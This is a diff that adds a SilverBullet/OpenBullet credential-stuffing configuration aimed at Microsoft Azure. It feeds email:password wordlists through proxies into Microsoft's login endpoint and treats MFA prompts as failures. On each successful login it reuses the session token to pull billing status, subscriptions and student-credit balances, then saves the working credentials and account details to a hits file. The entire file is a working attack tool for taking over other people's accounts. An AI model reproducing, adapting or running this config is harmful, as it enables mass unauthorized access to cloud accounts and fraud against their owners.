@@ -1,0 +1,347 @@
+[SETTINGS]
+{
+  "Name": "Microsoft Azure",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2022-12-03T16:04:26.1490894+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "anonymous",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Mail Pass",
+  "AllowedWordlist2": "Mail Pass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Azure",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#sessionID FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "sessionID" 
+
+REQUEST GET "https://portal.azure.com/signin/idpRedirect.js/?sessionId=1c7123d89f96494b8d2e6d70c5e75d48&feature.argsubscriptions=true&feature.showservicehealthalerts=true&feature.prefetchtokens=true&feature.internalgraphapiversion=true&feature.globalresourcefilter=true&idpc=0" 
+  
+  HEADER "Host: portal.azure.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: no-cors" 
+  HEADER "Sec-Fetch-Dest: script" 
+  HEADER "Referer: https://portal.azure.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#loginUrl PARSE "<SOURCE>" REGEX ",\\n\"(.*?)\"\\);" "[1]" -> VAR "loginUrl" 
+
+REQUEST GET "<loginUrl>" 
+  
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://portal.azure.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#sessionId PARSE "<SOURCE>" REGEX "\"sessionId\":\"(.*?)\"" "[1]" -> VAR "sessionId" 
+
+#sCtx PARSE "<SOURCE>" REGEX "\"sCtx\":\"(.*?)\"" "[1]" -> VAR "sCtx" 
+
+#flowToken PARSE "<SOURCE>" REGEX "\"sFT\":\"(.*?)\"" "[1]" -> VAR "flowToken" 
+
+#request PARSE "<SOURCE>" LR "u0026client-request-id=" "\\u0026" -> VAR "request" 
+
+#canary PARSE "<SOURCE>" LR "\",\"canary\":\"" "\",\"correlationId\":\"" EncodeOutput=TRUE -> VAR "canary" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://login.microsoftonline.com/common/login" 
+  CONTENT "i13=0&login=<US>&loginfmt=<US>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=<canary>&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<flowToken>&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=&i18=&i19=13209" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <loginUrl>" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect" 
+    KEY "passwordreset.microsoftonline.com" 
+    KEY "No tenant-identifying information found in either the request or implied by any provided credentials." 
+    KEY "Your email or password is incorrect. If you don\\'t remember your password" 
+    KEY "ad><title>Working...</title></" 
+    KEY "More information required" 
+    KEY "title>Redirecting...</title>" 
+  KEYCHAIN Success OR 
+    KEY "Your sign-in was successful but" 
+    KEY "Stay signed in?" 
+  KEYCHAIN Failure OR 
+    KEY "Enter code" 
+
+#sCtx PARSE "<SOURCE>" REGEX "\"sCtx\":\"(.*?)\"" "[1]" -> VAR "sCtx" 
+
+#sessionId PARSE "<SOURCE>" REGEX "\"sessionId\":\"(.*?)\"" "[1]" -> VAR "sessionId" 
+
+#flowToken PARSE "<SOURCE>" REGEX "\"sFT\":\"(.*?)\"" "[1]" -> VAR "flowToken" 
+
+#canary PARSE "<SOURCE>" LR "\",\"canary\":\"" "\",\"correlationId\":\"" EncodeOutput=TRUE -> VAR "canary" 
+
+#ksmi REQUEST POST "https://login.microsoftonline.com/kmsi" 
+  CONTENT "LoginOptions=1&type=28&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<flowToken>&canary=<canary>&i2=&i17=&i18=&i19=1666" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.microsoftonline.com/common/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#code PARSE "<SOURCE>" REGEX "(?<=name=\"code\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "code" 
+
+#id_token PARSE "<SOURCE>" REGEX "(?<=name=\"id_token\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "id_token" 
+
+#state PARSE "<SOURCE>" REGEX "(?<=name=\"state\" value=\")(.*?)(?=\" \\/>)" "[0]" EncodeOutput=TRUE -> VAR "state" 
+
+#session_state PARSE "<SOURCE>" REGEX "(?<=name=\"session_state\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "session_state" 
+
+#correlation_id PARSE "<SOURCE>" REGEX "(?<=name=\"correlation_id\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "correlation_id" 
+
+REQUEST POST "https://portal.azure.com/signin/index/" 
+  CONTENT "code=<code>&id_token=<id_token>&state=<state>&session_state=<session_state>&correlation_id=<correlation_id>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: portal.azure.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.microsoftonline.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#sessionId FUNCTION GenerateGUID -> VAR "sessionId" 
+
+#request_id FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "request_id" 
+
+#authHeader PARSE "<SOURCE>" REGEX "(?<={\"oAuthToken\":{\"authHeader\":\")(.*?)(?=\")" "[0]" -> VAR "authHeader" 
+
+REQUEST GET "https://management.azure.com/providers/Microsoft.Billing/billingAccounts?$expand=address&api-version=2019-10-01-preview" 
+  
+  HEADER "Host: management.azure.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-ms-client-session-id: <sessionId>" 
+  HEADER "x-ms-command-name: Microsoft_Azure_Billing." 
+  HEADER "Accept-Language: en" 
+  HEADER "Authorization: <authHeader>" 
+  HEADER "x-ms-effective-locale: en.en-us" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "x-ms-client-request-id: <request_id>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Origin: https://portal.azure.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Account_Status PARSE "<SOURCE>" JSON "value[*].properties.accountStatus" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Account Status" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<Account Status>" Contains "Active" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"value\":[]}" 
+
+#Account_Type PARSE "<SOURCE>" JSON "value[*].properties.accountType" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Account Type" 
+
+#Name PARSE "<SOURCE>" JSON "value[*].properties.displayName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Name" 
+
+REQUEST GET "https://management.azure.com/subscriptions?api-version=2018-02-01" 
+  
+  HEADER "Host: management.azure.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-ms-client-session-id: <sessionId>" 
+  HEADER "x-ms-command-name: Microsoft_Azure_Billing." 
+  HEADER "Accept-Language: en" 
+  HEADER "Authorization: <authHeader>" 
+  HEADER "x-ms-effective-locale: en.en-us" 
+  HEADER "Accept: */*" 
+  HEADER "x-ms-client-request-id: <request_id>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Origin: https://portal.azure.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#SubName PARSE "<SOURCE>" JSON "value[*].displayName" JTokenParsing=TRUE Recursive=TRUE -> VAR "displayName" 
+
+#state PARSE "<SOURCE>" JSON "value[*].state" JTokenParsing=TRUE Recursive=TRUE -> VAR "state" 
+
+#Subscriptions FUNCTION Constant "Subscription name = <displayName[*]>, Subscription Status = <state[*]> |" -> CAP "Subscriptions" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<state>" EqualTo "[Disabled]" 
+  KEYCHAIN Success OR 
+    KEY "<state[*]>" Contains "Enabled" 
+
+IF "<displayName[*]>" Contains "Azure for Students Starter"
+
+REQUEST GET "https://www.microsoftazuresponsorships.com/Balance" 
+  
+  HEADER "Host: www.microsoftazuresponsorships.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#code PARSE "<SOURCE>" REGEX "(?<=name=\"code\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "code" 
+
+#id_token PARSE "<SOURCE>" REGEX "(?<=name=\"id_token\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "id_token" 
+
+#state PARSE "<SOURCE>" REGEX "(?<=name=\"state\" value=\")(.*?)(?=\" \\/>)" "[0]" EncodeOutput=TRUE -> VAR "state" 
+
+#session_state PARSE "<SOURCE>" REGEX "(?<=name=\"session_state\" value=\")(.*?)(?=\" \\/>)" "[0]" -> VAR "session_state" 
+
+REQUEST POST "https://www.microsoftazuresponsorships.com/Account/Login" 
+  CONTENT "code=<code>&id_token=<id_token>&state=<state>&session_state=<session_state>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.microsoftazuresponsorships.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.microsoftonline.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Validity PARSE "<SOURCE>" REGEX "\"StartDate\":\"(.*?)-(.*?)-(.*?)T(.*?)\\..*?\",\"EndDate\":\"(.*?)-(.*?)-(.*?)T(.*?)\\..*?\"" "[3]-[2]-[1] [4] to [7]-[6]-[5] [8]" -> VAR "Validity" 
+
+#Balance PARSE "<SOURCE>" REGEX "\"MonetaryCap\":(.*?),.*?\"RemainingBalance\":(.*?)," "[2]/[1]" -> VAR "Balance" 
+
+PARSE "<SOURCE>" REGEX "\"EndDate\":\"(.*?)T.*?\\..*?\"" "[1]" -> VAR "Offer Expiring IN" 
+
+#Offer_Expiring_IN FUNCTION GetRemainingDay "<Offer Expiring IN>" -> VAR "Offer Expiring IN" 
+
+BEGIN SCRIPT JavaScript
+let index1 = Subscriptions.indexOf("Subscription name = Azure for Students Starter, Subscription Status = Enabled |");
+let index = index1 + 1;
+END SCRIPT -> VARS "index"
+
+#add UTILITY List "Subscriptions" Add "Validity = <Validity>, Balance = <Balance>, Offer Expiring IN = <Offer Expiring IN> |" "<index>" -> CAP "add" 
+
+FUNCTION Replace " |, Validity" ", Validity" "<Subscriptions>" -> CAP "Subscriptions" 
+
+ENDIF
+
+FUNCTION Replace " |, " " | " "<Subscriptions>" -> CAP "Subscriptions" 
+
+FUNCTION Replace " |]" "]" "<Subscriptions>" -> CAP "Subscriptions" 
+
+UTILITY File "Hits\\Microsoft Azure anonymous\\Azure Hits.txt" AppendLines "[+]-------- START -------[+]\\nAccount  = <USER>:<PASS>\\nEmail    = <USER>\\nPassword = <PASS>\\nProxy    = <PROXY>\\n-----------------------------\\n[+] Account Status = <Account Status>\\n[+] Account Type = <Account Type>\\n[+] Name = <Name>\\n[+] Subscriptions = <Subscriptions>\\n[+]Config made by = anonymous\\n[+]-------- END --------[+]\\n" -> VAR "save" 
+
